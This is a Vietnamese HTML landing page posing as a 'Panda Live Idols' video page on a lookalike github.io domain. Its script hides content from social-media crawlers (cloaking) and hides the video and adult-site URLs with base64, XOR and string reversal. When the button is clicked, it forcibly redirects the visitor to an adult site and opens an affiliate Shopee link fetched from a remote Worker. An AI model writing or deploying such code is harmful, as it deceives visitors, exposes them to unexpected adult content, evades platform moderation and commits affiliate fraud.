<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Panda Live Idols</title>
  <!-- Open Graph -->
  <meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="Panda Live Idols" />
  <meta property="og:description" content="Xem video mới nhất của Panda Live Idols" />
  <meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <style>
    html, body { margin:0; padding:0; height:100%; background:#000; }
    .video-container{ position:relative; width:100%; height:100%; overflow:hidden; }
    .video-container video{ width:100%; height:100%; object-fit:cover; background:#000; }
    .top-logo-right{ position:absolute; top:10px; right:10px; z-index:2000; max-width:150px; }
    .top-logo-left{ position:absolute; top:10px; left:10px; z-index:2000; max-width:150px; }
    .bottom-logo-left{ position:absolute; bottom:10px; left:10px; z-index:2000; max-width:120px; }
    .overlay{ position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1000; }
    .cta{ display:flex; align-items:center; gap:8px; background:rgba(0,17,61,0.85); color:#fff; border:none; border-radius:8px; padding:10px 18px; font-size:16px; cursor:pointer; }
    .cta img{ width:24px; height:24px; }
    @media (max-width:768px){
      .overlay{ top:auto; bottom:320px; transform:translateX(-50%); }
      .top-logo-left, .top-logo-right{ max-width:100px; }
      .bottom-logo-left{ max-width:90px; }
    }
    #thumbnail{ display:none; }
  </style>
</head>
<body>
  <!-- Thumbnail -->
  <div id="thumbnail">
    <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail" style="width:100%; height:auto;">
  </div>

  <!-- Nội dung -->
  <div id="real-content" class="video-container" style="display:none;">
    <video id="main-video" autoplay muted loop playsinline preload="auto"
      poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>
    <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number" class="top-logo-left" />
    <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class" class="top-logo-right" />
    <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ" class="bottom-logo-left" />
    <div class="overlay">
      <button class="cta" id="ctaBtn">
        <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" /> Panda Live Idols
      </button>
    </div>
  </div>

<script>
// ================== Helpers ==================
function xorDecode(str, key) {
  let res = '';
  for (let i = 0; i < str.length; i++) {
    res += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return res;
}
function reverseString(s) { return s.split('').reverse().join(''); }

const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
const xorKey = "PandaKey2025";

// Link 18+
const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";

// Fallback Shopee links
const fallbackLinks = {
  "VN": "https://s.shopee.vn/30dchvC74f",
  "MY": "https://invl.me/clmwy1t",
  "SG": "https://invl.me/clmwy1m",
  "PH": "https://invl.me/clmwy1v"
};

function getCountryByLang() {
  const lang = (navigator.language || "").toUpperCase();
  if (lang.includes("VI")) return "VN";
  if (lang.includes("MS") || lang.includes("MY")) return "MY";
  if (lang.includes("EN-SG") || lang.includes("SG")) return "SG";
  if (lang.includes("EN-PH") || lang.includes("PH")) return "PH";
  return "VN";
}

function isBot() {
  const ua = (navigator.userAgent || "").toLowerCase();
  const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly","whatsapp","telegrambot","discordbot"];
  return keywords.some(k => ua.includes(k)) || navigator.webdriver;
}

// Nhẹ hơn: chỉ 1 setTimeout + visibility
function navigate18Resilient(url) {
  let done = false;
  const go = () => {
    if (done) return;
    done = true;
    try { window.location.replace(url); } catch(_) { window.location.href = url; }
  };
  setTimeout(go, 120); // nhanh hơn
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") go();
  }, { once:true });
}

function fetchWithTimeout(resource, options = {}) {
  const { timeout = 1000 } = options; // giảm xuống 1s
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("timeout")), timeout);
    fetch(resource, options).then(
      res => { clearTimeout(timer); resolve(res); },
      err => { clearTimeout(timer); reject(err); }
    );
  });
}

// ================== Init ==================
document.addEventListener("DOMContentLoaded", function() {
  const thumbnail = document.getElementById("thumbnail");
  const real = document.getElementById("real-content");
  const vid = document.getElementById("main-video");

  if (isBot()) {
    thumbnail.style.display = "block";
    real.style.display = "none";
    return;
  }

  try {
    const raw = atob(enc3_b64);
    const step = xorDecode(raw, xorKey);
    const videoURL = reverseString(step);
    thumbnail.style.display = "none";
    real.style.display = "block";
    vid.src = videoURL;
    vid.play().catch(()=>{});
  } catch (err) {
    thumbnail.style.display = "block";
    real.style.display = "none";
  }

  document.getElementById("ctaBtn").addEventListener("click", async function(e){
    e.preventDefault();

    // PRE-OPEN tab với nội dung tạm, tránh blank
    let win = null;
    try {
      win = window.open("data:text/html,<p>Loading...</p>", "_blank","noopener,noreferrer");
    } catch(_) {}

    // Trang hiện tại → 18+
    const link18 = atob(link18_b64);
    navigate18Resilient(link18);

    // Lấy affiliate link từ Worker
    let affLink = fallbackLinks[getCountryByLang()] || fallbackLinks["VN"];
    try {
      const resp = await fetchWithTimeout("https://panda-redirect.kitthh1412.workers.dev/link?format=txt", {
        method:"GET", mode:"cors", cache:"no-store", timeout:1000
      });
      if (resp.ok) {
        const text = (await resp.text()||"").trim();
        if (/^https?:\/\//i.test(text)) affLink = text;
      }
    } catch(_) {}

    // Điều hướng tab Shopee
    if (win && !win.closed) {
      try { win.location.href = affLink; } catch(_) {}
    } else {
      const a = document.createElement("a");
      a.href = affLink;
      a.target = "_blank";
      a.rel = "noopener noreferrer";
      document.body.appendChild(a);
      a.click();
      setTimeout(()=>{ try{ a.remove(); }catch(_){} }, 3000);
    }
  });
});
</script>
</body>
</html>

